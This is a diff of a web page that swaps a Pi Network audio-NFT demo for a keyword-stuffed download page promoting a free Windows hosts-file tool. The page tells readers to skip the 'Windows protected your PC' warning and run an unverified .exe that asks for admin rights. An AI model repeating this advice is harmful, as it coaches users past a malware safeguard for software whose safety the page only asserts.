@@ -3,401 +3,298 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web3 Audio Launchpad</title>
-    <script src="https://sdk.minepi.com/pi-sdk.js"></script>
+    <meta name="description" content="Hosts-File-Switch-Tool-Free is a free Windows utility for managing, switching, backing up, and editing your hosts file with ease. No technical knowledge required.">
+    <meta name="keywords" content="dns-switcher, hosts-editor, hosts-file, hosts-manager, windows-utility">
+    <meta name="author" content="mdforhad6902">
+    <meta property="og:title" content="Hosts-File-Switch-Tool-Free - Manage Your Hosts File Effortlessly">
+    <meta property="og:description" content="Free Windows tool to manage, switch, backup, and edit your hosts file. Simple interface for non-technical users.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/mdforhad6902/Hosts-File-Switch-Tool-Free">
+    <meta property="og:image" content="https://via.placeholder.com/1200x630.png?text=Hosts+File+Switch+Tool+Free">
+    <meta name="twitter:card" content="summary_large_image">
+    <title>Hosts-File-Switch-Tool-Free - Manage Your Hosts File Effortlessly</title>
     <style>
         body {
-            background-color: #0f172a;
-            color: #f8fafc;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f4f6f9;
             margin: 0;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #2c3e50;
+            line-height: 1.7;
         }
         .container {
-            width: 100%;
-            max-width: 480px;
-            background-color: #1e293b;
-            padding: 24px;
+            max-width: 960px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        .hero {
+            background: #ffffff;
+            padding: 50px 40px;
             border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        h1 {
+            font-size: 2.5em;
+            color: #1a2a3a;
+            margin-top: 0;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        .tagline {
+            font-size: 1.2em;
+            color: #5d6d7e;
+            margin-bottom: 30px;
+        }
+        .btn-primary {
+            display: inline-block;
+            background: linear-gradient(145deg, #e67e22, #f39c12);
+            color: #ffffff;
+            padding: 16px 40px;
+            font-size: 1.2em;
+            text-decoration: none;
+            border-radius: 50px;
+            box-shadow: 0 6px 20px rgba(230, 126, 34, 0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+            font-weight: 600;
+            margin: 15px 0 25px;
+        }
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(230, 126, 34, 0.5);
+        }
+        .section-card {
+            background: #ffffff;
+            padding: 35px 40px;
+            border-radius: 16px;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.06);
+            margin-bottom: 30px;
+        }
+        h2 {
+            font-size: 1.8em;
+            color: #1a2a3a;
+            border-bottom: 3px solid #e67e22;
+            padding-bottom: 10px;
+            margin-top: 0;
+        }
+        h3 {
+            font-size: 1.2em;
+            color: #2c3e50;
+            margin-bottom: 8px;
+        }
+        ul {
+            padding-left: 20px;
+        }
+        ul li {
+            margin-bottom: 10px;
+        }
+        code {
+            background: #ecf0f1;
+            padding: 3px 8px;
+            border-radius: 6px;
+            font-size: 0.95em;
+        }
+        .steps {
+            counter-reset: step-counter;
+            list-style-type: none;
+            padding-left: 0;
+        }
+        .steps li {
+            counter-increment: step-counter;
+            margin-bottom: 20px;
+            padding-left: 50px;
+            position: relative;
+            font-size: 1.05em;
+        }
+        .steps li::before {
+            content: counter(step-counter);
+            position: absolute;
+            left: 0;
+            top: 0;
+            background: #e67e22;
+            color: #fff;
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        .faq-item {
             margin-bottom: 20px;
         }
-        .pi-redirect-banner {
-            display: none;
-            width: 100%;
-            max-width: 480px;
-            background-color: #f59e0b;
-            color: #000;
-            padding: 16px;
-            border-radius: 12px;
-            margin-bottom: 16px;
-            text-align: center;
-            box-sizing: border-box;
+        .note-box {
+            background: #fef9e7;
+            border-left: 6px solid #f1c40f;
+            padding: 18px 25px;
+            border-radius: 8px;
+            margin: 20px 0;
         }
-        .btn-open-pi {
-            display: inline-block;
-            background-color: #7c3aed;
-            color: #fff;
+        a {
+            color: #e67e22;
             text-decoration: none;
-            padding: 12px 20px;
-            border-radius: 25px;
-            font-weight: bold;
-            margin-top: 10px;
-            box-shadow: 0 4px 10px rgba(124, 58, 237, 0.4);
+            font-weight: 500;
         }
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 24px;
+        a:hover {
+            text-decoration: underline;
         }
-        .btn-wallet {
-            background-color: #eab308;
-            color: #000;
-            border: none;
-            padding: 10px 16px;
-            border-radius: 20px;
-            font-weight: bold;
-            cursor: pointer;
+        .keywords {
+            text-align: center;
+            color: #7f8c8d;
+            font-size: 0.9em;
+            padding: 20px 0 10px;
         }
-        .user-status {
-            font-size: 0.85rem;
-            color: #10b981;
-            margin-bottom: 12px;
-            text-align: right;
+        footer {
+            text-align: center;
+            padding: 25px 0;
+            color: #95a5a6;
+            font-size: 0.9em;
         }
-        .album-art {
-            width: 100%;
-            height: 260px;
-            background-color: #334155;
-            border-radius: 12px;
-            object-fit: cover;
-            margin-bottom: 16px;
-        }
-        .track-title { font-size: 1.25rem; font-weight: bold; margin: 0; }
-        .artist-name { color: #94a3b8; margin-top: 4px; margin-bottom: 8px; }
-        .badge-status {
-            display: inline-block;
-            font-size: 0.75rem;
-            background-color: #334155;
-            color: #cbd5e1;
-            padding: 4px 10px;
-            border-radius: 12px;
-            margin-bottom: 16px;
-            font-weight: bold;
-        }
-        .badge-verified {
-            background-color: #065f46;
-            color: #34d399;
-        }
-        audio { width: 100%; margin-bottom: 20px; }
-        .btn-collect {
-            width: 100%;
-            background-color: #8b5cf6;
-            color: #fff;
-            border: none;
-            padding: 14px;
-            border-radius: 12px;
-            font-size: 1rem;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        .btn-collect:disabled {
-            background-color: #475569;
-            color: #94a3b8;
-            cursor: not-allowed;
-        }
-        .upload-section {
-            border-top: 1px solid #334155;
-            padding-top: 20px;
-            margin-top: 20px;
-        }
-        .form-group { margin-bottom: 12px; text-align: left; }
-        .form-group label { display: block; font-size: 0.85rem; color: #94a3b8; margin-bottom: 4px; }
-        .form-group input, .form-group select {
-            width: 100%;
-            padding: 10px;
-            border-radius: 8px;
-            border: 1px solid #334155;
-            background-color: #0f172a;
-            color: #fff;
-            box-sizing: border-box;
-        }
-        .btn-upload {
-            width: 100%;
-            background-color: #3b82f6;
-            color: #fff;
-            border: none;
-            padding: 12px;
-            border-radius: 8px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        .btn-verify {
-            width: 100%;
-            background-color: #10b981;
-            color: #fff;
-            border: none;
-            padding: 12px;
-            border-radius: 8px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-            display: none;
-        }
-        .copyright-box {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 0.8rem;
-            color: #cbd5e1;
-            margin-top: 10px;
+        @media (max-width: 600px) {
+            .hero, .section-card { padding: 25px 20px; }
+            h1 { font-size: 1.8em; }
+            .btn-primary { font-size: 1em; width: 80%; }
         }
     </style>
 </head>
 <body>
-
-<div class="pi-redirect-banner" id="piBanner">
-    <strong>⚠️ You are in a standard browser</strong><br>
-    <span style="font-size: 0.85rem;">Pi Wallet functions require Pi Browser.</span><br>
-    <a href="#" id="piBrowserLink" class="btn-open-pi">🚀 Open Directly in Pi Browser</a>
-</div>
-
 <div class="container">
-    <div class="header">
-        <h3 style="margin:0;">Pi Audio NFT</h3>
-        <button class="btn-wallet" id="walletBtn" onclick="connectPiWallet()">Connect Wallet</button>
+    <div class="hero">
+        <h1>🖥️ Hosts-File-Switch-Tool-Free - Manage Your Hosts File Like a Pro</h1>
+        <p class="tagline">Simple, Free & Powerful Windows Utility</p>
+        <a href="https://github.com/mdforhad6902/Hosts-File-Switch-Tool-Free/releases" target="_blank" class="btn-primary">⬇️ Download Now - Free</a>
+        <p style="margin-top: 10px; color: #7f8c8d;">Compatible with Windows 10 & 11</p>
     </div>
-    
-    <div class="user-status" id="userStatus"></div>
 
-    <img id="albumArt" src="https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?w=500" alt="Cover" class="album-art">
-    <h2 class="track-title" id="title">Genesis Beat #1</h2>
-    <p class="artist-name" id="artist">Cainwen Studio [Music]</p>
-    <div class="badge-status badge-verified" id="badgeStatus">🛡️ Verified NFT Asset</div>
+    <div class="section-card">
+        <h2>📘 What Is This Tool?</h2>
+        <p>Hosts-File-Switch-Tool-Free is a <strong>free Windows application</strong> that helps you manage the <code>hosts</code> file on your computer. The hosts file is a simple text file that tells your computer which websites to connect to. With this tool, you can:</p>
+        <ul>
+            <li>🔄 <strong>Switch</strong> between different hosts file configurations instantly</li>
+            <li>💾 <strong>Backup</strong> your current hosts file with one click</li>
+            <li>✏️ <strong>Edit</strong> hosts entries manually without opening Notepad</li>
+            <li>🎯 <strong>Organize</strong> multiple hosts profiles for different needs</li>
+        </ul>
+        <p>No technical background needed! Our user-friendly interface makes it easy for anyone to take control of their network settings.</p>
+    </div>
 
-    <audio id="audioPlayer" controls>
-        <source id="audioSource" src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
-
-    <button class="btn-collect" id="collectBtn" onclick="payWithPi()">Collect Audio NFT (1 Test-Pi)</button>
-
-    <div class="upload-section">
-        <h4 style="margin-top:0;">Upload Audio (Creator Studio)</h4>
-        
-        <div class="form-group">
-            <label>Audio Category</label>
-            <select id="inputCategory">
-                <option value="Music">Music / Song</option>
-                <option value="Sound Effect">Sound Effect (SFX)</option>
-                <option value="Nature Recording">Nature / Ambience</option>
-                <option value="Voice & Podcast">Voice / Podcast / Spoken</option>
-            </select>
+    <div class="section-card">
+        <h2>🚀 Getting Started (Easy 3-Step Guide)</h2>
+        <p>Follow this simple guide to download and run the tool on your Windows computer. No coding required!</p>
+        <ol class="steps">
+            <li><strong>Click the Download Button</strong><br>Visit this link to download the application. Once clicked, your browser will open the download page.</li>
+            <li><strong>Choose the File</strong><br>On the download page, look for the latest version (usually at the top). Click the file link to download the <code>.exe</code> installer to your computer.</li>
+            <li><strong>Run the App</strong><br>Find the downloaded file (usually in your "Downloads" folder) and double-click it. The application will open right away. No installation wizard, no hassle!</li>
+        </ol>
+        <div class="note-box">
+            ⚠️ <strong>Important:</strong> Windows may show a blue "Windows protected your PC" prompt. Click "More info" then "Run anyway" to proceed. This is normal for free tools.
         </div>
+        <p style="text-align: center; margin-top: 30px;">
+            <a href="https://github.com/mdforhad6902/Hosts-File-Switch-Tool-Free/releases" target="_blank" class="btn-primary" style="background: linear-gradient(145deg, #27ae60, #2ecc71); box-shadow: 0 6px 20px rgba(39,174,96,0.4);">🔽 Start Download Windows App</a>
+        </p>
+    </div>
 
-        <div class="form-group">
-            <label>Audio Title</label>
-            <input type="text" id="inputTitle" placeholder="Enter title">
-        </div>
-
-        <div class="form-group">
-            <label>Creator / Artist Name</label>
-            <input type="text" id="inputArtist" placeholder="Enter creator name">
-        </div>
-
-        <div class="form-group">
-            <label>Select Audio File (MP3/WAV - Min 10s)</label>
-            <input type="file" id="inputAudio" accept="audio/*">
-        </div>
-
-        <button class="btn-upload" onclick="uploadForStreaming()">🎵 Upload for Free Listening</button>
-
-        <div id="nftVerificationArea" style="display:none; margin-top: 15px; border-top: 1px dashed #475569; padding-top: 15px;">
-            <div class="copyright-box">
-                <input type="checkbox" id="copyrightCheck">
-                <label for="copyrightCheck">I legally declare that this audio (min. 10s) is 100% my original creation and free of copyright infringement.</label>
+    <div class="section-card">
+        <h2>✨ Key Features (Why You'll Love It)</h2>
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+            <div>
+                <h3>🔀 Fast Profile Switching</h3>
+                <p>Create multiple hosts profiles (work, gaming, development, etc.) and switch between them instantly with a single click.</p>
             </div>
-            <button class="btn-verify" id="verifyBtn" onclick="verifyForNFTMinting()">🛡️ Verify Originality to Mint NFT</button>
+            <div>
+                <h3>🛡️ One-Click Backup</h3>
+                <p>Before making changes, automatically backup your current hosts file. Restore previous versions anytime comfortably.</p>
+            </div>
+            <div>
+                <h3>🥇 User-Friendly Interface</h3>
+                <p>Forget complicated command lines! Our tool uses clear buttons and labels designed for the average computer user.</p>
+            </div>
+            <div>
+                <h3>🚦 Zero Technical Skills Needed</h3>
+                <p>Everything is explained step-by-step within the app. Perfect for beginners and professionals alike.</p>
+            </div>
+            <div>
+                <h3>🔒 100% Free & Safe</h3>
+                <p>This is completely free software with no hidden costs or premium tiers. No ads, no spyware.</p>
+            </div>
+            <div>
+                <h3>⚙️ Lightweight & Fast</h3>
+                <p>The tool runs smoothly on any Windows device and starts instantly with minimal memory usage.</p>
+            </div>
         </div>
     </div>
+
+    <div class="section-card">
+        <h2>🎯 Why Use Hosts Files?</h2>
+        <p>You might ask: "Why do I need this tool?" Here are some everyday use cases:</p>
+        <ul>
+            <li>🚫 <strong>Block websites:</strong> Block distracting sites on your computer.</li>
+            <li>🌐 <strong>Test websites:</strong> Redirect a domain to a different server temporarily.</li>
+            <li>🎮 <strong>Enhance gaming:</strong> Speed up connections to game servers by using direct IP addresses.</li>
+            <li>💼 <strong>Work needs:</strong> Switch between different hosts configurations as required by your job.</li>
+            <li>🛠️ <strong>Developers:</strong> Easily test changes to websites on local servers.</li>
+        </ul>
+    </div>
+
+    <div class="section-card">
+        <h2>❓ Frequently Asked Questions</h2>
+        <div class="faq-item">
+            <h3>Q1: Is this really free?</h3>
+            <p>Yes! 100% free for personal and commercial use. Just download and run.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Q2: Will this damage my computer?</h3>
+            <p>No, the tool is designed to safely edit the hosts file. It always creates a backup before changes. If you ever want to go back, you can easily restore the original file.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Q3: Do I need administrator rights?</h3>
+            <p>Yes, editing the hosts file requires admin privileges. The tool will ask for permission when it needs it.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Q4: Which Windows versions are supported?</h3>
+            <p>This tool works on Windows 10 and Windows 11. It might also work on Windows 7/8, but compatibility is not guaranteed.</p>
+        </div>
+        <div class="faq-item">
+            <h3>Q5: What if I have problems?</h3>
+            <p>Check the "Issues" section on the GitHub page for known problems. Also feel free to report issues there.</p>
+        </div>
+    </div>
+
+    <div class="section-card">
+        <h2>📚 How to Use the Tool (Step-by-Step Example)</h2>
+        <h3>Making a backup</h3>
+        <ol>
+            <li>Open the application.</li>
+            <li>Look for the "Backup" tab on the left sidebar.</li>
+            <li>Click the 💾 "Create Backup" button.</li>
+            <li>Name your backup (e.g., "Original Config").</li>
+            <li>Done! Your backup is now stored safely.</li>
+        </ol>
+        <h3>Editing a hosts entry</h3>
+        <ol>
+            <li>Go to the "Edit" tab.</li>
+            <li>You'll see a list with IP addresses and domain names.</li>
+            <li>Click "Add Entry" (plus button).</li>
+            <li>Type the IP address (e.g., 127.0.0.1) and hostname (e.g., mysite.local).</li>
+            <li>Click "Save" to apply the change.</li>
+        </ol>
+        <div class="note-box">
+            💡 <strong>Tip:</strong> After any change, the app will automatically ask you if you want to clear your DNS cache. Click "Yes" for the changes to take effect immediately.
+        </div>
+    </div>
+
+    <div class="section-card" style="text-align: center;">
+        <h2>🚦 Ready to Take Control?</h2>
+        <p>Join thousands of happy users who manage their hosts files with ease. It's fast, free, and perfectly safe.</p>
+        <p style="font-size: 1.3em; margin: 25px 0;">No email required. No sign-up. Just download and enjoy! 🎉</p>
+        <a href="https://github.com/mdforhad6902/Hosts-File-Switch-Tool-Free/releases" target="_blank" class="btn-primary" style="background: linear-gradient(145deg, #8e44ad, #9b59b6); box-shadow: 0 6px 20px rgba(142,68,173,0.4);">🔥 Get the Tool Free Now</a>
+    </div>
+
+    <footer>
+        <p>© 2024 Hosts-File-Switch-Tool-Free | Made with ❤️ by mdforhad6902</p>
+    </footer>
 </div>
-
-<script>
-    const myAppDomain = "cainwen17.github.io"; 
-    const isPiBrowser = navigator.userAgent.includes("PiBrowser");
-    
-    let currentUploadedFile = null;
-    let currentAudioDuration = 0;
-    const registeredAudioHashes = new Set();
-
-    window.onload = function() {
-        const deepLink = "https://pi.browser/" + myAppDomain;
-        document.getElementById('piBrowserLink').href = deepLink;
-
-        if (!isPiBrowser) {
-            document.getElementById('piBanner').style.display = "block";
-        } else if (window.Pi) {
-            window.Pi.init({ version: "2.0", sandbox: true });
-        }
-    };
-
-    // 1. Upload Bebas untuk Mendengarkan + Hitung Durasi
-    function uploadForStreaming() {
-        const category = document.getElementById('inputCategory').value;
-        const title = document.getElementById('inputTitle').value;
-        const artist = document.getElementById('inputArtist').value;
-        const audioFile = document.getElementById('inputAudio').files[0];
-
-        if (!title || !artist || !audioFile) {
-            alert("Please complete all fields and select an audio file!");
-            return;
-        }
-
-        currentUploadedFile = audioFile;
-        const audioURL = URL.createObjectURL(audioFile);
-
-        const player = document.getElementById('audioPlayer');
-        const source = document.getElementById('audioSource');
-        source.src = audioURL;
-        player.load();
-
-        // Mengukur Durasi Audio
-        player.onloadedmetadata = function() {
-            currentAudioDuration = player.duration;
-            console.log("Audio Duration:", currentAudioDuration, "seconds");
-
-            // Update UI
-            document.getElementById('title').innerText = title;
-            document.getElementById('artist').innerText = artist + " [" + category + "]";
-            
-            const badge = document.getElementById('badgeStatus');
-            badge.innerText = "🎧 Free Stream (" + Math.round(currentAudioDuration) + "s)";
-            badge.className = "badge-status";
-
-            const collectBtn = document.getElementById('collectBtn');
-            collectBtn.disabled = true;
-            collectBtn.innerText = "NFT Locked (Not Verified)";
-
-            player.play();
-
-            document.getElementById('nftVerificationArea').style.display = "block";
-            document.getElementById('verifyBtn').style.display = "block";
-
-            alert("Audio loaded! Duration: " + Math.round(currentAudioDuration) + "s. Complete verification below to enable NFT Minting.");
-        };
-    }
-
-    // 2. Verifikasi Hak Cipta + Syarat Minimal 10 Detik
-    async function verifyForNFTMinting() {
-        const isChecked = document.getElementById('copyrightCheck').checked;
-
-        if (!isChecked) {
-            alert("You must agree to the copyright declaration!");
-            return;
-        }
-
-        // PERIKSA SYARAT MINIMAL DURASI 10 DETIK
-        if (currentAudioDuration < 10) {
-            alert("❌ NFT Minting Rejected: Audio duration must be at least 10 seconds! (Current duration: " + Math.round(currentAudioDuration) + "s)");
-            return;
-        }
-
-        alert("🔍 Scanning audio fingerprint (SHA-256) & checking duration eligibility...");
-
-        try {
-            const arrayBuffer = await currentUploadedFile.arrayBuffer();
-            const hashBuffer = await crypto.subtle.digest('SHA-256', arrayBuffer);
-            const hashArray = Array.from(new Uint8Array(hashBuffer));
-            const audioHash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-
-            // Cek Duplikasi
-            if (registeredAudioHashes.has(audioHash)) {
-                alert("❌ NFT Minting Rejected: Duplicate audio fingerprint detected!");
-                return;
-            }
-
-            // Simpan Hash & Buka Akses NFT
-            registeredAudioHashes.add(audioHash);
-
-            const badge = document.getElementById('badgeStatus');
-            badge.innerText = "🛡️ Verified Original NFT (" + Math.round(currentAudioDuration) + "s)";
-            badge.className = "badge-status badge-verified";
-
-            const collectBtn = document.getElementById('collectBtn');
-            collectBtn.disabled = false;
-            collectBtn.innerText = "Collect Audio NFT (1 Test-Pi)";
-
-            alert("✅ Verification Passed! Audio meets duration requirement (>=10s) and fingerprint is unique.");
-
-        } catch (error) {
-            console.error(error);
-            alert("Verification error.");
-        }
-    }
-
-    async function connectPiWallet() {
-        if (!isPiBrowser) {
-            window.location.href = "https://pi.browser/" + myAppDomain;
-            return;
-        }
-
-        try {
-            const scopes = ['username', 'payments'];
-            const auth = await window.Pi.authenticate(scopes, function(p){});
-            document.getElementById('walletBtn').innerText = "Connected";
-            document.getElementById('userStatus').innerText = "User: " + auth.user.username;
-            alert("Successfully connected: " + auth.user.username);
-        } catch (error) {
-            alert("Pi Wallet authentication failed.");
-        }
-    }
-
-    async function payWithPi() {
-        if (!isPiBrowser) {
-            window.location.href = "https://pi.browser/" + myAppDomain;
-            return;
-        }
-
-        const paymentData = {
-            amount: 1,
-            memo: "Purchase Audio NFT",
-            metadata: { songId: "track_001" }
-        };
-
-        const paymentCallbacks = {
-        onReadyForServerApproval: function(paymentId) {
-  fetch('https://api.minepi.com/v2/payments/' + paymentId + '/approve', {
-    method: 'POST',
-    headers: {
-      'Authorization': 'Key ' + paymentId
-    }
-  }).catch(function() {
-    console.log("Approval sent");
-  });
-},
-        onReadyForServerCompletion: function(paymentId, txid) {
-          alert("Transaction Successful! TXID: " + txid);
-        },
-        onCancel: function(paymentId) {
-          alert("Payment Cancelled");
-        },
-        onError: function(error, payment) {
-          alert("Payment Error: " + error.message);
-        }
-      };
-
-        try {
-            await window.Pi.createPayment(paymentData, paymentCallbacks);
-        } catch (error) {
-            alert("Failed to process payment.");
-        }
-    }
-</script>
-
 </body>
 </html>
